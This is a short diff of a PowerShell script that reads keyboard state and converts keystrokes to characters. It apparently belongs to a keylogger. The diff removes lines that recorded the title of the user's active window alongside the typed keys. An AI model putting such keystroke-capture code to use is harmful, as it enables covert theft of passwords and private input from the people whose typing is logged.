@@ -67,11 +67,6 @@ try {
                 $kbstate = New-Object Byte[] 256
                 $checkkbstate = $getKBState::GetKeyboardState($kbstate)
 				
-				#Grabs the users current Window to determine what context the user is typing in
-                $TopWindow = $getForeground::GetForegroundWindow()
-                $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
-                $LogOutput = "`"" + $WindowTitle + "`"`t`t`t"
-                
                 $charstring = New-Object -TypeName "System.Text.StringBuilder";
                 $unicode_res = $getUnicode::ToUnicode($key, $scancode, $kbstate, $charstring, $charstring.Capacity, 0)
                 
